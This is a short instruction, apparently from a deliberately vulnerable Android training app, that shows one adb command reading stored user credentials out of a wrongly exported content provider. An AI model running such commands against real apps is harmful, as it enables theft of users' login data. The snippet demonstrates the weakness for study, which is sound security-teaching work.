To read the users login data from the wrongfully exported content provider via terminal, simply run

``
adb shell content read --uri content://com.dkronig.root.CustomContentProvider/maswe_0064_user_credentials.txt
``

in a terminal with adb installed, and the content provider will provide you with the sensitive user credentials.
